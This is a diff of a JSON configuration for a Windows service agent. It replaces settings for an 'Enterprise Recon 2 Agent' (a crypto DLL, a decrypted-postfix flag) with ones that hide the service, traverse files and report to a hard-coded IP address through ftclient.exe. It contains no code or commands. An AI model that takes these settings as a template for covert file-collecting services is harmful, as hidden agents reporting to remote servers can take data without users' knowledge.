@@ -1,11 +1,11 @@
-﻿{
-    "debug": true,
-    "sleep_seconds": 5,
-    "dll_name": "CryptDll.dll",
-    "server_address": "183.107.9.230:11119",
-    "hostname": "DESKTOP-K316RAH",
-    "bAppendDecryptedPostfix": true,
-    "service_name": "Enterprise Recon 2 Agent",
-    "min_sleep_seconds": 1,
-    "log_level": 20
+{
+  "SVC_NAME": "MyService19",
+  "SVC_DISPLAY_NAME": "MyService16",
+  "SVC_DESCRIPTION": "Service Description",
+  "SVC_LOOP_DELAY_SECONDS": "5",
+  "DSCS_ALL_FILES_TRAVERSED": "False",
+  "SVC_HIDE": "True",
+  "API_SERVER_ADDR": "183.107.9.230",
+  "API_SERVER_PORT": "11119",
+  "FILE_NAME_MAINEXE": "ftclient.exe"
 }
